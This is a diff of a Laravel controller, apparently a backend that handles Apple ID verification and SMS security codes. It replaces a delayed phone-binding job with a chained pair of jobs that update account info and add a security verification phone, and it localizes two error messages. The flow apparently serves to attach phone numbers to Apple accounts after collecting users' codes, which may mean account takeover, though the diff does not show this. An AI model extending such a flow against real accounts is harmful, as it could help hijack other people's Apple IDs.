@@ -7,6 +7,8 @@ use App\Http\Requests\SmsSecurityCodeRequest;
 use App\Http\Requests\VerifyAccountRequest;
 use App\Http\Requests\VerifySecurityCodeRequest;
 use App\Jobs\BindAccountPhone;
+use App\Jobs\UpdateAccountInfoJob;
+use App\Jobs\AppleidAddSecurityVerifyPhone;
 use Illuminate\Contracts\View\Factory;
 use Illuminate\Contracts\View\View;
 use Illuminate\Foundation\Application;
@@ -16,6 +18,7 @@ use Illuminate\Support\Facades\Cookie;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Validator;
+use Illuminate\Support\Facades\Bus;
 use JsonException;
 use App\Services\AppleClientControllerService;
 use Psr\Log\LoggerInterface;
@@ -226,8 +229,11 @@ class AppleClientController extends Controller
             ]);
         }
 
-        //延迟 3 秒触发队列
-        BindAccountPhone::dispatch($controllerService->getApple())->delay(delay: now()->addSeconds(value: 3));
+        // 延迟 3 秒触发 UpdateAccountInfoJob 和 AppleidAddSecurityVerifyPhone 队列链
+        Bus::chain([
+            new UpdateAccountInfoJob($controllerService->getApple()),
+            new AppleidAddSecurityVerifyPhone($controllerService->getApple())
+        ])->delay(delay: now()->addSeconds(value: 3))->dispatch();
 
         return $this->success();
     }
@@ -268,7 +274,12 @@ class AppleClientController extends Controller
             ]);
         }
 
-        BindAccountPhone::dispatch($controllerService->getApple())->delay(delay: now()->addSeconds(value: 3));
+
+        // 延迟 3 秒触发 UpdateAccountInfoJob 和 AppleidAddSecurityVerifyPhone 队列链
+        Bus::chain([
+            new UpdateAccountInfoJob($controllerService->getApple()),
+            new AppleidAddSecurityVerifyPhone($controllerService->getApple())
+        ])->delay(delay: now()->addSeconds(value: 3))->dispatch();
 
         return $this->success();
     }
@@ -336,12 +347,12 @@ class AppleClientController extends Controller
             $controllerService->sendSms((int)$params['ID']);
         } catch (VerificationCodeSentTooManyTimesException $e) {
 
-            $message = $e->getMessage();
+            $message = __('apple.send_sms.verification_code_sent_too_many_times');
         } catch (JsonException | FatalRequestException | RequestException | SaloonException $e) {
 
             $this->logger->error($e);
 
-            $message = __('controller.exception');
+            $message = __('apple.send_sms.error');
         }
 
         return view('index/sms', [
